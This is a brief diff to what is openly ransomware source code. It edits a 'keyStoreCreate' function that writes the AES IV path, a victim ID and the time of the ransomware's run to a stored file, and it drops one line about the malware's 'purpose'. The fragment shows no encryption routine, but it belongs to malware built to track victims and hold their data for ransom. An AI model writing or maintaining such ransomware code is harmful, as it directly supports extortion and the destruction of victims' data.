@@ -97,7 +97,6 @@ def keyStoreCreate(version,ransomid):
 
     with open(utils.aesIV_file_store_path,"w") as key_storing_file:
         key_storing_file.write(utils.who_we_are + version + "\n")
-        key_storing_file.write(utils.what_is_my_purpose + "\n")
         key_storing_file.write("Your Victim ID : "+ransomid + "\n")
         key_storing_file.write("When did ransomware work : " + utils.when_did_i_work + "\n")
         # and so on
